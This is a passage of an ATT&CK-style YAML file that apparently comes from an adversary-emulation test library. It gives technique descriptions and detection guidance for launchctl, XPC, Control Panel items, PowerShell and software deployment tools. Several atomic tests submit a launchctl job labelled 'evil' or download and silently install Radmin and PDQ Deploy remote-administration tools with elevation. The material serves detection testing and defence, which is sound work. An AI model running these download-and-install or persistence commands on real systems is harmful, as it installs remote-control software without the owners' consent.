      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_defense_bypassed:
      - Process whitelisting
      - Data Execution Prevention
      - Exploit Prevention
      x_mitre_permissions_required:
      - User
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1569.001:
    technique:
      x_mitre_platforms:
      - macOS
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--810aa4ad-61c9-49cb-993f-daa06199421d
      type: attack-pattern
      created: '2020-03-10T18:26:56.187Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1569.001
        url: https://attack.mitre.org/techniques/T1569/001
      - source_name: Launchctl Man
        url: https://ss64.com/osx/launchctl.html
        description: SS64. (n.d.). launchctl. Retrieved March 28, 2020.
      - url: https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/
        description: Dani Creus, Tyler Halfpop, Robert Falcone. (2016, September 26).
          Sofacy's 'Komplex' OS X Trojan. Retrieved July 8, 2017.
        source_name: Sofacy Komplex Trojan
      - source_name: 20 macOS Common Tools and Techniques
        url: https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/
        description: Phil Stokes. (2021, February 16). 20 Common Tools & Techniques
          Used by macOS Threat Actors & Malware. Retrieved August 23, 2021.
      modified: '2021-10-15T18:40:23.141Z'
      name: 'System Services: Launchctl'
      description: |
        Adversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.(Citation: Launchctl Man)

        Adversaries use launchctl to execute commands and programs as [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s. Common subcommands include: <code>launchctl load</code>,<code>launchctl unload</code>, and <code>launchctl start</code>. Adversaries can use scripts or manually run the commands <code>launchctl load -w "%s/Library/LaunchAgents/%s"</code> or <code>/bin/launchctl load</code> to execute [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s.(Citation: Sofacy Komplex Trojan)(Citation: 20 macOS Common Tools and Techniques)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_detection: "Every Launch Agent and Launch Daemon must have a corresponding
        plist file on disk which can be monitored. Monitor for recently modified or
        created plist files with a significant change to the executable path executed
        with the command-line <code>launchctl</code> command. Plist files are located
        in the root, system, and users <code>/Library/LaunchAgents</code> or <code>/Library/LaunchDaemons</code>
        folders. \n\nMonitor command-line execution of the <code>launchctl</code>
        command immediately followed by abnormal network connections. [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s
        or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s with executable
        paths pointing to <code>/tmp</code> and <code>/Shared</code> folders locations
        are potentially suspicious. \n\nWhen removing [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s
        or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s ensure
        the services are unloaded prior to deleting plist files."
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Service: Service Creation'
      - 'File: File Modification'
      - 'Command: Command Execution'
      - 'Process: Process Creation'
      x_mitre_permissions_required:
      - User
      - root
      identifier: T1569.001
    atomic_tests:
    - name: Launchctl
      auto_generated_guid: 6fb61988-724e-4755-a595-07743749d4e2
      description: 'Utilize launchctl

        '
      supported_platforms:
      - macos
      input_arguments:
        executable_path:
          description: Path of the executable to run.
          type: path
          default: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"
        label_name:
          description: Path of the executable to run.
          type: string
          default: evil
      executor:
        command: 'launchctl submit -l #{label_name} -- #{executable_path}

          '
        cleanup_command: 'launchctl remove #{label_name}

          '
        name: bash
  T1059.008:
    technique:
      x_mitre_platforms:
      - Network
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--818302b2-d640-477b-bf88-873120ce85c4
      created: '2020-10-20T00:09:33.072Z'
      x_mitre_version: '1.1'
      external_references:
      - source_name: mitre-attack
        external_id: T1059.008
        url: https://attack.mitre.org/techniques/T1059/008
      - source_name: Cisco IOS Software Integrity Assurance - Command History
        url: https://tools.cisco.com/security/center/resources/integrity_assurance.html#23
        description: Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Command
          History. Retrieved October 21, 2020.
      - source_name: Cisco Synful Knock Evolution
        url: https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices
        description: Graham Holmes. (2015, October 8). Evolution of attacks on Cisco
          IOS devices. Retrieved October 19, 2020.
      x_mitre_deprecated: false
      revoked: false
      description: "Adversaries may abuse scripting or built-in command line interpreters
        (CLI) on network devices to execute malicious command and payloads. The CLI
        is the primary means through which users and administrators interact with
        the device in order to view system information, modify device operations,
        or perform diagnostic and administrative functions. CLIs typically contain
        various permission levels required for different commands. \n\nScripting interpreters
        automate tasks and extend functionality beyond the command set included in
        the network OS. The CLI and scripting interpreter are accessible through a
        direct console connection, or through remote means, such as telnet or [SSH](https://attack.mitre.org/techniques/T1021/004).\n\nAdversaries
        can use the network CLI to change how network devices behave and operate.
        The CLI may be used to manipulate traffic flows to intercept or manipulate
        data, modify startup configuration parameters to load malicious system software,
        or to disable security features or logging to avoid detection.(Citation: Cisco
        Synful Knock Evolution)"
      modified: '2022-04-19T20:28:09.848Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: Network Device CLI
      x_mitre_detection: |-
        Consider reviewing command history in either the console or as part of the running memory to determine if unauthorized or suspicious commands were used to modify device configuration.(Citation: Cisco IOS Software Integrity Assurance - Command History)

        Consider comparing a copy of the network device configuration against a known-good version to discover unauthorized changes to the command interpreter. The same process can be accomplished through a comparison of the run-time memory, though this is non-trivial and may require assistance from the vendor.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_is_subtechnique: true
      x_mitre_data_sources:
      - 'Command: Command Execution'
      x_mitre_remote_support: true
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1559.003:
    technique:
      x_mitre_platforms:
      - macOS
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Csaba Fitzl @theevilbit of Offensive Security
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--8252f135-ed26-4ce1-ae61-f26e94429a19
      created: '2021-10-12T06:45:36.763Z'
      x_mitre_version: '1.0'
      external_references:
      - source_name: mitre-attack
        external_id: T1559.003
        url: https://attack.mitre.org/techniques/T1559/003
      - source_name: creatingXPCservices
        url: https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html#//apple_ref/doc/uid/10000172i-SW6-SW1
        description: Apple. (2016, September 9). Creating XPC Services. Retrieved
          April 19, 2022.
      - source_name: Designing Daemons Apple Dev
        url: https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/DesigningDaemons.html
        description: Apple. (n.d.). Retrieved October 12, 2021.
      - source_name: CVMServer Vuln
        url: https://www.trendmicro.com/en_us/research/21/f/CVE-2021-30724_CVMServer_Vulnerability_in_macOS_and_iOS.html
        description: 'Mickey Jin. (2021, June 3). CVE-2021-30724: CVMServer Vulnerability
          in macOS and iOS. Retrieved October 12, 2021.'
      - source_name: Learn XPC Exploitation
        url: https://wojciechregula.blog/post/learn-xpc-exploitation-part-3-code-injections/
        description: Wojciech Reguła. (2020, June 29). Learn XPC exploitation. Retrieved
          October 12, 2021.
      x_mitre_deprecated: false
      revoked: false
      description: |-
        Adversaries can provide malicious content to an XPC service daemon for local code execution. macOS uses XPC services for basic inter-process communication between various processes, such as between the XPC Service daemon and third-party application privileged helper tools. Applications can send messages to the XPC Service daemon, which runs as root, using the low-level XPC Service <code>C API</code> or the high level <code>NSXPCConnection API</code> in order to handle tasks that require elevated privileges (such as network connections). Applications are responsible for providing the protocol definition which serves as a blueprint of the XPC services. Developers typically use XPC Services to provide applications stability and privilege separation between the application client and the daemon.(Citation: creatingXPCservices)(Citation: Designing Daemons Apple Dev)

        Adversaries can abuse XPC services to execute malicious content. Requests for malicious execution can be passed through the application's XPC Services handler.(Citation: CVMServer Vuln)(Citation: Learn XPC Exploitation) This may also include identifying and abusing improper XPC client validation and/or poor sanitization of input parameters to conduct [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).
      modified: '2022-04-20T22:54:47.164Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: XPC Services
      x_mitre_detection: ''
      kill_chain_phases:
      - phase_name: execution
        kill_chain_name: mitre-attack
      x_mitre_is_subtechnique: true
      x_mitre_data_sources:
      - 'Process: Process Access'
      x_mitre_remote_support: false
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1204:
    technique:
      x_mitre_platforms:
      - Linux
      - Windows
      - macOS
      - IaaS
      - Containers
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Oleg Skulkin, Group-IB
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5
      created: '2018-04-18T17:59:24.739Z'
      x_mitre_version: '1.5'
      external_references:
      - source_name: mitre-attack
        external_id: T1204
        url: https://attack.mitre.org/techniques/T1204
      - source_name: Telephone Attack Delivery
        url: https://www.proofpoint.com/us/blog/threat-insight/caught-beneath-landline-411-telephone-oriented-attack-delivery
        description: 'Selena Larson, Sam Scholten, Timothy Kromphardt. (2021, November
          4). Caught Beneath the Landline: A 411 on Telephone Oriented Attack Delivery.
          Retrieved January 5, 2022.'
      x_mitre_deprecated: false
      revoked: false
      description: |-
        An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).

        While [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).

        Adversaries may also deceive users into performing actions such as enabling [Remote Access Software](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary, or downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204). For example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Software](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)
      modified: '2022-04-19T20:31:15.373Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: User Execution
      x_mitre_detection: |-
        Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain Initial Access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) in payloads.

        Anti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_is_subtechnique: false
      x_mitre_data_sources:
      - 'Network Traffic: Network Connection Creation'
      - 'Container: Container Start'
      - 'File: File Creation'
      - 'Command: Command Execution'
      - 'Network Traffic: Network Traffic Content'
      - 'Process: Process Creation'
      - 'Instance: Instance Start'
      - 'Instance: Instance Creation'
      - 'Application Log: Application Log Content'
      - 'Container: Container Creation'
      - 'Image: Image Creation'
      x_mitre_remote_support: false
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1196:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--8df54627-376c-487c-a09c-7d2b5620f56e
      type: attack-pattern
      created: '2018-04-18T17:59:24.739Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1196
        url: https://attack.mitre.org/techniques/T1196
      - source_name: Microsoft Implementing CPL
        description: M. (n.d.). Implementing Control Panel Items. Retrieved January
          18, 2018.
        url: https://msdn.microsoft.com/library/windows/desktop/cc144185.aspx
      - url: https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf
        description: Mercês, F. (2014, January 27). CPL Malware - Malicious Control
          Panel Items. Retrieved January 18, 2018.
        source_name: TrendMicro CPL Malware Jan 2014
      - url: https://blog.trendmicro.com/trendlabs-security-intelligence/control-panel-files-used-as-malicious-attachments/
        description: Bernardino, J. (2013, December 17). Control Panel Files Used
          As Malicious Attachments. Retrieved January 18, 2018.
        source_name: TrendMicro CPL Malware Dec 2013
      - url: https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered/
        description: Grunzweig, J. and Miller-Osborn, J. (2017, November 10). New
          Malware with Ties to SunOrcal Discovered. Retrieved November 16, 2017.
        source_name: Palo Alto Reaver Nov 2017
      modified: '2020-01-31T18:59:21.682Z'
      name: Control Panel Items
      description: |-
        Windows Control Panel items are utilities that allow users to view and adjust computer settings. Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a CPlApplet function. (Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file. (Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013)

        For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel. (Citation: Microsoft Implementing CPL)

        Adversaries can use Control Panel items as execution payloads to execute arbitrary commands. Malicious Control Panel items can be delivered via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) campaigns (Citation: TrendMicro CPL Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013) or executed as part of multi-stage malware. (Citation: Palo Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also bypass application and/or file extension whitelisting.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_detection: |-
        Monitor and analyze activity related to items associated with CPL files, such as the Windows Control Panel process binary (control.exe) and the Control_RunDLL and ControlRunDLLAsUser API functions in shell32.dll. When executed from the command line or clicked, control.exe will execute the CPL file (ex: <code>control.exe file.cpl</code>) before [Rundll32](https://attack.mitre.org/techniques/T1085) is used to call the CPL's API functions (ex: <code>rundll32.exe shell32.dll,Control_RunDLL file.cpl</code>). CPL files can be executed directly via the CPL API function with just the latter [Rundll32](https://attack.mitre.org/techniques/T1085) command, which may bypass detections and/or execution filters for control.exe. (Citation: TrendMicro CPL Malware Jan 2014)

        Inventory Control Panel items to locate unregistered and potentially malicious files present on systems:

        * Executable format registered Control Panel items will have a globally unique identifier (GUID) and registration Registry entries in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ControlPanel\NameSpace</code> and <code>HKEY_CLASSES_ROOT\CLSID\{GUID}</code>. These entries may contain information about the Control Panel item such as its display name, path to the local file, and the command executed when opened in the Control Panel. (Citation: Microsoft Implementing CPL)
        * CPL format registered Control Panel items stored in the System32 directory are automatically shown in the Control Panel. Other Control Panel items will have registration entries in the <code>Cpls</code> and <code>Extended Properties</code> Registry keys of <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Control Panel</code>. These entries may include information such as a GUID, path to the local file, and a canonical name used to launch the file programmatically (<code> WinExec("c:\windows\system32\control.exe {Canonical_Name}", SW_NORMAL);</code>) or from a command line (<code>control.exe /name {Canonical_Name}</code>). (Citation: Microsoft Implementing CPL)
        * Some Control Panel items are extensible via Shell extensions registered in <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Controls Folder\{name}\Shellex\PropertySheetHandlers</code> where {name} is the predefined name of the system item. (Citation: Microsoft Implementing CPL)

        Analyze new Control Panel items as well as those present on disk for malicious content. Both executable and CPL formats are compliant Portable Executable (PE) images and can be examined using traditional tools and methods, pending anti-reverse-engineering techniques. (Citation: TrendMicro CPL Malware Jan 2014)
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_defense_bypassed:
      - Application whitelisting
      - Process whitelisting
      x_mitre_permissions_required:
      - User
      - Administrator
      - SYSTEM
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1053.004:
    technique:
      x_mitre_platforms:
      - macOS
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--8faedf87-dceb-4c35-b2a2-7286f59a3bc3
      type: attack-pattern
      created: '2019-12-03T14:15:27.452Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1053.004
        url: https://attack.mitre.org/techniques/T1053/004
      - url: https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html
        description: Apple. (n.d.). Creating Launch Daemons and Agents. Retrieved
          July 10, 2017.
        source_name: AppleDocs Launch Agent Daemons
      - url: https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf
        description: Patrick Wardle. (2014, September). Methods of Malware Persistence
          on Mac OS X. Retrieved July 5, 2017.
        source_name: Methods of Mac Malware Persistence
      modified: '2021-10-07T21:38:03.610Z'
      name: Launchd
      description: "This technique is deprecated due to the inaccurate usage. The
        report cited did not provide technical detail as to how the malware interacted
        directly with launchd rather than going through known services. Other system
        services are used to interact with launchd rather than launchd being used
        by itself. \n\nAdversaries may abuse the <code>Launchd</code> daemon to perform
        task scheduling for initial or recurring execution of malicious code. The
        <code>launchd</code> daemon, native to macOS, is responsible for loading and
        maintaining services within the operating system. This process loads the parameters
        for each launch-on-demand system-level daemon from the property list (plist)
        files found in <code>/System/Library/LaunchDaemons</code> and <code>/Library/LaunchDaemons</code>
        (Citation: AppleDocs Launch Agent Daemons). These LaunchDaemons have property
        list files which point to the executables that will be launched (Citation:
        Methods of Mac Malware Persistence).\n\nAn adversary may use the <code>launchd</code>
        daemon in macOS environments to schedule new executables to run at system
        startup or on a scheduled basis for persistence. <code>launchd</code> can
        also be abused to run a process under the context of a specified account.
        Daemons, such as <code>launchd</code>, run with the permissions of the root
        user account, and will operate regardless of which user account is logged
        in."
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      - kill_chain_name: mitre-attack
        phase_name: persistence
      - kill_chain_name: mitre-attack
        phase_name: privilege-escalation
      x_mitre_detection: "Monitor scheduled task creation from common utilities using
        command-line invocation. Legitimate scheduled tasks may be created during
        installation of new software or through system administration functions. Look
        for changes to tasks that do not correlate with known software, patch cycles,
        etc. \n\nSuspicious program execution through scheduled tasks may show up
        as outlier processes that have not been seen before when compared against
        historical data. Data and events should not be viewed in isolation, but as
        part of a chain of behavior that could lead to other activities, such as network
        connections made for Command and Control, learning details about the environment
        through Discovery, and Lateral Movement."
      x_mitre_is_subtechnique: true
      x_mitre_deprecated: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - root
    atomic_tests: []
  T1072:
    technique:
      modified: '2023-03-30T21:01:36.669Z'
      name: Software Deployment Tools
      description: |-
        Adversaries may gain access to and use third-party software suites installed within an enterprise network, such as administration, monitoring, and deployment systems, to move laterally through the network. Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, HBSS, Altiris, etc.).

        Access to a third-party network-wide or enterprise-wide software system may enable an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.

        The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform it's intended purpose.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_contributors:
      - Shane Tully, @securitygypsy
      x_mitre_detection: "Detection methods will vary depending on the type of third-party
        software or system and how it is typically used. \n\nThe same investigation
        process can be applied here as with other potentially malicious activities
        where the distribution vector is initially unknown but the resulting activity
        follows a discernible pattern. Analyze the process execution trees, historical
        activities from the third-party application (such as what types of files are
        usually pushed), and the resulting activities or events from the file/binary/script
        pushed to systems. \n\nOften these third-party applications will have logs
        of their own that can be collected and correlated with other data from the
        environment. Ensure that third-party application logs are on-boarded to the
        enterprise logging system and the logs are regularly reviewed. Audit software
        deployment logs and look for suspicious or unauthorized activity. A system
        not typically used to push software to clients that suddenly is used for such
        a task outside of a known admin function may be suspicious. Monitor account
        login activity on these applications to detect suspicious/abnormal usage.\n\nPerform
        application deployment at regular times so that irregular deployment activity
        stands out. Monitor process activity that does not correlate to known good
        software. Monitor account login activity on the deployment system."
      x_mitre_domains:
      - enterprise-attack
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_version: '2.1'
      x_mitre_data_sources:
      - 'Application Log: Application Log Content'
      - 'Process: Process Creation'
      x_mitre_permissions_required:
      - User
      - Administrator
      - SYSTEM
      x_mitre_remote_support: true
      type: attack-pattern
      id: attack-pattern--92a78814-b191-47ca-909c-1ccfe3777414
      created: '2017-05-31T21:30:57.201Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1072
        external_id: T1072
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_is_subtechnique: false
      identifier: T1072
    atomic_tests:
    - name: Radmin Viewer Utility
      auto_generated_guid: b4988cad-6ed2-434d-ace5-ea2670782129
      description: 'An adversary may use Radmin Viewer Utility to remotely control
        Windows device, this will start the radmin console.

        '
      supported_platforms:
      - windows
      input_arguments:
        radmin_installer:
          description: Radmin Viewer installer
          type: path
          default: RadminViewer.msi
        radmin_exe:
          description: The radmin.exe executable from RadminViewer.msi
          type: path
          default: Radmin Viewer 3/Radmin.exe
      dependency_executor_name: powershell
      dependencies:
      - description: 'Radmin Viewer Utility must be installed at specified location
          (#{radmin_exe})

          '
        prereq_command: 'if (Test-Path "${env:ProgramFiles(x86)}/#{radmin_exe}") {exit
          0} else {exit 1}

          '
        get_prereq_command: |
          Write-Host Downloading radmin installer
          (New-Object Net.WebClient).DownloadFile("https://www.radmin.com/download/Radmin_Viewer_3.5.2.1_EN.msi","$ENV:Temp\#{radmin_installer}")
          Write-Host Install Radmin
          Start-Process msiexec  -Wait -ArgumentList /i , $ENV:Temp\#{radmin_installer}, /qn
      executor:
        name: command_prompt
        elevation_required: true
        command: '"%PROGRAMFILES(x86)%/#{radmin_exe}"

          '
    - name: PDQ Deploy RAT
      auto_generated_guid: e447b83b-a698-4feb-bed1-a7aaf45c3443
      description: 'An adversary may use PDQ Deploy Software to deploy the Remote
        Adminstartion Tool, this will start the PDQ console.

        '
      supported_platforms:
      - windows
      input_arguments:
        PDQ_Deploy_installer:
          description: PDQ Deploy Install
          type: path
          default: PDQDeploysetup.exe
        PDQ_Deploy_exe:
          description: The PDQDeployConsole.exe executable from PDQDeploysetup.exe
          type: path
          default: Admin Arsenal/PDQ Deploy/PDQDeployConsole.exe
      dependency_executor_name: powershell
      dependencies:
      - description: 'PDQ Deploy will be installed at specified location (#{PDQ_Deploy_exe})

          '
        prereq_command: 'if (Test-Path "${env:ProgramFiles(x86)}/#{PDQ_Deploy_exe}")
          {exit 0} else {exit 1}

          '
        get_prereq_command: |
          Write-Host Downloading PDQ Deploy installer
          (New-Object Net.WebClient).DownloadFile("https://download.pdq.com/release/19/Deploy_19.3.350.0.exe","$ENV:Temp\#{PDQ_Deploy_installer}")
          Write-Host Install PDQ Deploy
          Start-Process $ENV:Temp\#{PDQ_Deploy_installer} -Wait -ArgumentList "/s"
      executor:
        name: command_prompt
        elevation_required: true
        command: '"%PROGRAMFILES(x86)%/#{PDQ_Deploy_exe}"

          '
  T1059.001:
    technique:
      modified: '2023-03-27T17:19:48.136Z'
      name: 'Command and Scripting Interpreter: PowerShell'
      description: |-
        Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).

        PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.

        A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)

        PowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_contributors:
      - Mayuresh Dani, Qualys
      - Praetorian
      - Ross Brittain
      x_mitre_deprecated: false
      x_mitre_detection: |-
        If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.

        Monitor for loading and/or execution of artifacts associated with PowerShell specific assemblies, such as System.Management.Automation.dll (especially to unusual process names/locations).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)

        It is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution (which is applied to .NET invocations). (Citation: Malware Archaeology PowerShell Cheat Sheet) PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.(Citation: FireEye PowerShell Logging 2016) An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.

        Consider monitoring for Windows event ID (EID) 400, which shows the version of PowerShell executing in the <code>EngineVersion</code> field (which may also be relevant to detecting a potential [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)) as well as if PowerShell is running locally or remotely in the <code>HostName</code> field. Furthermore, EID 400 may indicate the start time and EID 403 indicates the end time of a PowerShell session.(Citation: inv_ps_attacks)
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Windows
      x_mitre_version: '1.3'
      x_mitre_data_sources:
      - 'Process: Process Metadata'
      - 'Script: Script Execution'
      - 'Process: Process Creation'
      - 'Command: Command Execution'
      - 'Module: Module Load'
      x_mitre_remote_support: true
      type: attack-pattern
      id: attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736
      created: '2020-03-09T13:48:55.078Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1059/001
        external_id: T1059.001
      - source_name: Microsoft PSfromCsharp APR 2014
        description: Babinec, K. (2014, April 28). Executing PowerShell scripts from
          C#. Retrieved April 22, 2019.
        url: https://blogs.msdn.microsoft.com/kebab/2014/04/28/executing-powershell-scripts-from-c/
      - source_name: SilentBreak Offensive PS Dec 2015
        description: Christensen, L.. (2015, December 28). The Evolution of Offensive
          PowerShell Invocation. Retrieved December 8, 2018.
        url: https://web.archive.org/web/20190508170150/https://silentbreaksecurity.com/powershell-jobs-without-powershell-exe/
      - source_name: FireEye PowerShell Logging 2016
        description: Dunwoody, M. (2016, February 11). GREATER VISIBILITY THROUGH
          POWERSHELL LOGGING. Retrieved February 16, 2016.
        url: https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html
      - source_name: Github PSAttack
        description: Haight, J. (2016, April 21). PS>Attack. Retrieved June 1, 2016.
        url: https://github.com/jaredhaight/PSAttack
